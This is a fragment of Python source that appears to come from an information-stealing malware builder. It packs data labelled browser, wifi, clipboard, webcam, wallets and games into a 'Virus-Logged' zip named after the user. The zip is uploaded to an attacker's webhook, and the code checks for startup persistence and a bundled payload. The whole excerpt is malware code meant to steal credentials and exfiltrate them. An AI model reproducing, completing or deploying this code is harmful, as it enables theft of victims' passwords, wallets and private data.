...
def main(webhook: str):
	...
	_zipfile = os.path.join(localappdata, f'Virus-Logged-{os.getlogin()}.zip')
	...
	_file = f'{localappdata}\\Virus-Logged-{os.getlogin()}.zip'
	...
	if any(__CONFIG__[key] for key in ["browser", "wifi", "common_files", "clipboard", "webcam", "wallets", "games"]):
		with open(_file, 'rb') as file:
			encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Virus-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def Virus(webhook: str):
	...
	if isExecutable and (__CONFIG__["bound_startup"] or not inStartup) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.Virus")):
